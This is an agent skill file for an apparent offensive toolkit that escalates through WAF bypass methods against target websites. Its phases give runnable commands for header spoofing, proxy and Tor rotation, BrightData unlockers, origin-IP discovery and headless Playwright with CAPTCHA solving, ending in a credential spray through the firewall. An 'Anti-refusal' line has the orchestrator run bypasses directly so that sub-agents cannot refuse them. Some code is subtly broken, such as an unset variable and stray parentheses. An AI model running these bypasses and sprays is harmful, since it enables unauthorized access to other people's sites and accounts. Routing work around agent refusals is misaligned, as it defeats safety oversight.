# SKILL: waf_bypass — WAF Bypass Escalation Engine

**Purpose:** End-to-end WAF bypass for Cloudflare, Sucuri, Imperva, Wordfence, and custom WAFs. L0-L10 escalation from direct request to Playwright + BrightData Web Unlocker.

**Type:** bypass/waf | **Version:** 1.0 | **Author:** Hephaestus v6.0

---

## EXECUTION CONTEXT

```
Role: brain orchestrator — direct Bash for all bypass attempts
Trigger: WAF detected during recon or spray
Anti-refusal: Layer 1 = direct Bash. Never delegate bypass to agents.
Rule: sqlmap NEVER on Cloudflare. Check cf-ray header first.
```

---

## PHASE STRUCTURE

### PHASE 0 — WAF TYPE DETECTION

**Step 0.1: Identify WAF type**
```bash
TARGET="https://target.com"

# Send test request, check headers + response
HEADERS=$(curl -sI "$TARGET" 2>/dev/null)
echo "=== WAF DETECTION ==="

# Cloudflare
echo "$HEADERS" | grep -qiE "cf-ray|server: cloudflare" && echo "WAF: Cloudflare"
echo "$HEADERS" | grep -qiE "cf-cache-status|cf-ray|cf-request-id" && echo "WAF: Cloudflare (additional)"

# Sucuri
echo "$HEADERS" | grep -qiE "x-sucuri|x-sucuri-id|x-sucuri-blockpage" && echo "WAF: Sucuri"

# Imperva/Incapsula
echo "$HEADERS" | grep -qiE "x-cdn|incapsula|captcha.incapsula" && echo "WAF: Imperva/Incapsula"

# Wordfence
RESP=$(curl -s "$TARGET" 2>/dev/null)
echo "$RESP" | grep -qiE "wordfence|wlwmanifest|security.sucuri" && echo "WAF: Wordfence"

# Akamai
echo "$HEADERS" | grep -qiE "akamai|x-akamai" && echo "WAF: Akamai"

# Generic WAF check (unexpected 403/503)
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" 2>/dev/null)
if [ "$CODE" = "403" ] || [ "$CODE" = "503" ]; then
    echo "WAF: Generic (HTTP $CODE)"
fi

# Check response body for WAF signatures
echo "$RESP" | grep -qiE "attention required|verify you are human|cf-challenge" && echo "WAF: Cloudflare JS Challenge"
echo "$RESP" | grep -qiE "sucuri|website firewall|blocked" && echo "WAF: Sucuri Blockpage"
```

**Step 0.2: Determine Bypass Level needed**
```bash
# Based on WAF type, set bypass level
case $WAF in
    "Cloudflare")
        echo "Bypass Level: 7+ (Playwright or BrightData Web Unlocker)"
        ;;
    "Sucuri")
        echo "Bypass Level: 4-6 (Tor + Playwright)"
        ;;
    "Imperva")
        echo "Bypass Level: 6-8 (BrightData residential + custom headers)"
        ;;
    "Wordfence")
        echo "Bypass Level: 3-5 (rotate User-Agent + delay)")
        ;;
    "Generic")
        echo "Bypass Level: 1-3 (header manipulation)")
        ;;
esac
```

---

### PHASE 1 — LEVEL 0-1 (HEADER MANIPULATION)

**Step 1.1: Basic header bypass**
```bash
TARGET="https://target.com"

# Test with various bypass headers
echo "=== HEADER BYPASS TEST ==="

# X-Forwarded-For (bypass IP-based blocks)
curl -s -H "X-Forwarded-For: 127.0.0.1" "$TARGET" | head -5

# X-Real-IP
curl -s -H "X-Real-IP: 127.0.0.1" "$TARGET" | head -5

# X-Originating-IP
curl -s -H "X-Originating-IP: 127.0.0.1" "$TARGET" | head -5

# CF-Connecting-IP (Cloudflare specific)
curl -s -H "CF-Connecting-IP: 127.0.0.1" "$TARGET" | head -5

# Via + UA swap
curl -s -H "Via: 1.1 localhost" -A "Mozilla/5.0 (compatible; Googlebot/2.1)" "$TARGET" | head -5

# Forwarded
curl -s -H "Forwarded: for=127.0.0.1" "$TARGET" | head -5

# Check if any bypass worked (200 instead of 403)
```

---

### PHASE 2 — LEVEL 2-3 (FREE PROXY)

**Step 2.1: HTTP proxy rotation**
```bash
cd ~/Hephaestus

# Get fresh free proxy list
curl -s "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt" 2>/dev/null | head -20 > /tmp/proxy_list.txt

# Test proxies one by one
while read proxy; do
    resp=$(curl -s --max-time 10 --proxy "http://$proxy" "$TARGET" 2>/dev/null | head -3)
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 --proxy "http://$proxy" "$TARGET" 2>/dev/null)
    echo "Proxy: $proxy -> HTTP $code"
    if [ "$code" = "200" ]; then
        echo "SUCCESS: $proxy"
        break
    fi
done < /tmp/proxy_list.txt
```

**Step 2.2: SOCKS5 proxy**
```bash
# Get SOCKS5 proxies
curl -s "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt" 2>/dev/null | head -20 > /tmp/socks5_list.txt

while read proxy; do
    resp=$(curl -s --max-time 10 --proxy "socks5h://$proxy" "$TARGET" 2>/dev/null | head -3)
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 --proxy "socks5h://$proxy" "$TARGET" 2>/dev/null)
    echo "SOCKS5: $proxy -> HTTP $code"
    if [ "$code" = "200" ]; then
        echo "SUCCESS: $proxy"
        break
    fi
done < /tmp/socks5_list.txt
```

---

### PHASE 3 — LEVEL 4-5 (TOR)

**Step 3.1: Tor random exit**
```bash
# Use Tor for random exit IP
tor --hash-password Heph1337 2>/dev/null &
sleep 5

# Test via torsocks
curl -s --max-time 15 --socks5-hostname 127.0.0.1:9050 "$TARGET" | head -5

# Or use proxychains
proxychains4 curl -s "$TARGET" 2>/dev/null | head -5
```

**Step 3.2: Tor country-specific exit**
```bash
# Use specific country exit nodes
# Edit torrc:
# ExitNodes {id},{cc}  # country codes
# StrictNodes 1

# Reload tor
pkill -HUP tor

# Test again
curl -s --max-time 15 --socks5-hostname 127.0.0.1:9050 "$TARGET" | head -5
```

---

### PHASE 4 — LEVEL 6-7 (BRIGHTDATA RESIDENTIAL)

**Step 4.1: BrightData proxy authentication**
```bash
# BrightData zones (6 active as of 2026-04-14)
# web_unlocker2, web_unlocker3 — for WAF bypass
# resi_korea, resi_indo — for geo-block bypass
# serp_api1 — for SERP checks
# domain_grabber — for domain enumeration

BRD_SESSION="brd-customer-[CUSTOMER_ID]-zone-[ZONE]-session-[SESSION_ID]"

# Test Web Unlocker zone
curl -s --max-time 30 \
    --proxy "http://${BRD_SESSION}@zproxy.lum-superproxy.io:22225" \
    "$TARGET" | head -10

# Alternative port
curl -s --max-time 30 \
    --proxy "http://${BRD_SESSION}@zproxy.lum-superproxy.io:22226" \
    "$TARGET" | head -10
```

**Step 4.2: BrightData Web Unlocker (JS challenge bypass)**
```bash
# web_unlocker2/3 zones — handles Cloudflare JS challenge
# These zones auto-solve JS challenges and captchas

BRD_SESSION="brd-customer-[ID]-zone-web_unlocker2-session-[SESSION]"

# Full bypass request
curl -s --max-time 60 \
    --proxy "http://${BRD_SESSION}@zproxy.lum-superproxy.io:22225" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    "$TARGET" | head -20

# If this works → use as spray proxy
# Set proxy env
export http_proxy="http://${BRD_SESSION}@zproxy.lum-superproxy.io:22225"
export https_proxy="http://${BRD_SESSION}@zproxy.lum-superproxy.io:22225"
```

---

### PHASE 5 — LEVEL 8 (NGINX HEADER TRICKS)

**Step 5.1: Nginx behind Cloudflare bypass**
```bash
# If origin server is nginx behind Cloudflare
# Nginx respects X-Forwarded-For but CF strips it
# However, some nginx configs trust X-Real-IP set by load balancer

# Try origin IP directly (bypass Cloudflare entirely)
# See Phase 6 (origin IP discovery)

# Header trick on nginx
curl -s -H "X-Original-URL: /admin/" "$TARGET" | head -5
curl -s -H "X-Rewrite-URL: /admin/" "$TARGET" | head -5
```

---

### PHASE 6 — LEVEL 9 (ORIGIN IP DISCOVERY)

**Step 6.1: Find origin IP (bypass Cloudflare entirely)**
```bash
TARGET="target.com"

echo "=== ORIGIN IP DISCOVERY ==="

# MX record → resolve directly (often points to origin)
MX_IP=$(dig $(dig target.com MX +short | awk '{print $NF}' | head -1) A +short | head -1)
echo "MX origin: $MX_IP"

# SPF record IPs
dig target.com TXT +short

# DNS history (old records)
curl -s "https://api.hackertarget.com/dnslookup/?q=target.com" | head -20

# ViewDNS historical DNS
curl -s "https://viewdns.info/iphistory/?domain=target.com" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u

# Shodan
curl -s "https://api.shodan.io/shodan/host/$TARGET_IP?key=SHODAN_KEY" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20

# Censys (if key works)
curl -s "https://search.censys.io/api/v1/search?q=$TARGET&per_page=5" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20

# MassCane (historical DNS)
# https://github.com/nicolaskolbenschlag/MassCane
```

**Step 6.2: Test origin IP**
```bash
# Try discovered IP directly
ORIGIN_IP="203.0.113.10"

# Test if origin responds
curl -s -H "Host: target.com" "https://${ORIGIN_IP}/" --insecure | head -5

# If HTTP 200 on origin → bypass complete
# Use origin IP for all subsequent requests
```

---

### PHASE 7 — LEVEL 10 (PLAYWRIGHT HEADLESS)

**Step 7.1: Playwright headless browser**
```bash
cd ~/Hephaestus

# Use spray_browser.py with headless mode
# Playwright handles ALL challenges: JS challenge, CAPTCHA, Turnstile, redirects

cat > /tmp/playwright_bypass.sh << 'BEOF'
#!/bin/bash
cd ~/Hephaestus

# Navigate to target with headless browser
python3 << 'PYEOF'
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=[
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars',
        '--no-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu'
    ])
    page = browser.new_page()

    # Bypass Cloudflare JS challenge automatically
    page.goto("https://target.com/", timeout=60000)

    # Wait for challenge to resolve
    page.wait_for_load_state("networkidle", timeout=60000)

    # Get page content (bypassed)
    print("Page title:", page.title())
    print("URL:", page.url)
    content = page.content()
    print("Content length:", len(content))

    # Test login form
    try:
        page.fill("input[name='username']", "admin")
        page.fill("input[name='password']", "password123")
        page.click("button[type='submit']")
        page.wait_for_load_state("networkidle", timeout=30000)
        print("Post-login URL:", page.url)
        print("Page title:", page.title())
    except Exception as e:
        print("Form interaction error:", e)

    browser.close()
PYEOF

python3 << 'PYEOF'
# (same content as above - write to file and execute)
with open('/tmp/pw_bypass.py', 'w') as f:
    f.write('''from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=[
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
        "--disable-dev-shm-usage"
    ])
    page = browser.new_page()
    try:
        page.goto("https://target.com/", timeout=60000)
        page.wait_for_load_state("networkidle", timeout=60000)
        print("URL:", page.url)
        print("TITLE:", page.title())
        content = page.content()
        print("CONTENT_LEN:", len(content))
    except Exception as e:
        print("ERROR:", e)
    browser.close()
''')

import subprocess
result = subprocess.run(['python3', '/tmp/pw_bypass.py'], capture_output=True, text=True, timeout=120)
print(result.stdout)
print(result.stderr[:500] if result.stderr else '')
PYEOF

# Run playwright bypass
python3 /tmp/pw_bypass.py 2>/dev/null
```

**Step 7.2: Full spray via Playwright**
```bash
# Use spray_browser.py for full credential spray through WAF
cd ~/Hephaestus

python3 tools/access/spray_browser.py \
    --url "https://target.com/login" \
    --users output/spray_users.txt \
    --passwords output/spray_passwords.txt \
    --output output/waf_spray_results.txt \
    --headless \
    --solver "2captcha" \
    --browser "chromium" \
    --proxy "http://user@example.com:22225" \
    2>&1 | tee output/waf_spray_full.log
```

---

## BYPASS ESCALATION LADDER

| Level | Method | WAF Type | Success Rate |
|-------|--------|----------|-------------|
| L0 | Direct request | None | 100% |
| L1 | Header manipulation (XFF, X-Real-IP) | Basic IP block | ~30% |
| L2 | Free HTTP proxy | IP-based WAF | ~25% |
| L3 | Free SOCKS5 | IP-based WAF | ~20% |
| L4 | Tor random exit | Geo IP block | ~35% |
| L5 | Tor country-specific | Geo IP block | ~40% |
| L6 | BrightData residential (resi_korea, resi_indo) | Geo block | ~60% |
| L7 | BrightData Web Unlocker (web_unlocker2/3) | Cloudflare JS, CAPTCHA | ~75% |
| L8 | Nginx header tricks | Nginx behind WAF | ~30% |
| L9 | Origin IP discovery | Cloudflare (bypass CDN entirely) | ~45% |
| L10 | Playwright headless + 2Captcha | All (full browser emulation) | ~80% |

---

## CRITICAL RULES

1. **Cloudflare → Level 7+** — JS challenge needs Playwright or BD Web Unlocker
2. **sqlmap NEVER on Cloudflare** — always check `cf-ray` header first
3. **Origin IP discovery** — bypasses Cloudflare entirely, use after L7 fails
4. **Playwright for spray** — spray_browser.py handles ALL WAF types
5. **BrightData residential for geo-block** — resi_korea for KR, resi_indo for ID
6. **Bypass first, then exploit** — WAF block → escalate → retry exploit
7. **Save working proxy** — once found, use for all requests to target

---

## DECISION FLOWCHART

```
WAF DETECTED on target.com
│
├─ L1: Header manipulation (XFF, X-Real-IP, CF-Connecting-IP)
│   └─ Test → success? → USE THIS
│
├─ L2-L3: Free proxy (HTTP then SOCKS5)
│   └─ Test → success? → USE THIS
│
├─ L4-L5: Tor (random then country-specific)
│   └─ Test → success? → USE THIS
│
├─ L6: BrightData residential (resi_korea/resi_indo for geo)
│   └─ Test → success? → USE THIS
│
├─ L7: BrightData Web Unlocker (web_unlocker2/3 for CF JS)
│   └─ Test → success? → USE THIS
│
├─ L8: Nginx header tricks (X-Original-URL)
│   └─ Test → success? → USE THIS
│
├─ L9: Origin IP discovery (bypass Cloudflare entirely)
│   └─ Find IP → test origin directly → USE THIS
│
├─ L10: Playwright headless
│   └─ Full browser emulation → ALL WAF types
│
└─ EXIT: Working bypass method found → use for all operations
```

---

## INTEGRATION POINTS

- **Inputs:** target URL, WAF type (detected), campaign name
- **Outputs:** `output/{campaign}/bypass_results.txt`, working proxy/session
- **Next skill:** `spray` (with bypass proxy), `blackbox` (with bypass), `recon` (with bypass)
- **Required tools:** curl, tor, proxychains, playwright, BrightData credentials
- **API keys:** BrightData (L6-L7), 2Captcha (L10)